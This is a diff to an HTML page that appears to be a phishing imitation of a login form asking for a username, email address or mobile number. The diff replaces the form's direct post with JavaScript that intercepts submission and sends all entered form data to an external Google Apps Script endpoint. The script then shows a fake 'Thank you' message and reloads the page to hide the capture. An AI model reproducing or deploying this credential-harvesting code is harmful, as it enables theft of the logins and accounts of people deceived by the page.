@@ -254,7 +254,7 @@
         <br>
         <br>
         <br>
-            <form action="https://script.google.com/macros/s/AKfycbzo7-Yr7J8dK_UfJ5OZZVYs_E7MxrQlC1ho2OP1pk4fZrA4OsJ8U1Ja8GPA_7HDY2DVTw/exec" method="POST" >
+            <form action="" name="formName" method="POST" >
         
             <input type="text" name="Username" placeholder="Username, Email Address or Mobile Number" id="Username" required="">
             <br>
@@ -306,6 +306,21 @@
 
         alert("Submit now wait....");
             }
+
+
+
+
+
+                const scriptURL = 'https://script.google.com/macros/s/AKfycbzo7-Yr7J8dK_UfJ5OZZVYs_E7MxrQlC1ho2OP1pk4fZrA4OsJ8U1Ja8GPA_7HDY2DVTw/exec'
+			const form = document.forms['formName']
+		  
+			form.addEventListener('submit', e => {
+			  e.preventDefault()
+			  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+				.then(response => alert("Thank you! your form is submitted successfully." ))
+				.then(() => {  window.location.reload(); })
+				.catch(error => console.error('Error!', error.message))
+			})
             </script>
     </body>
 </html>
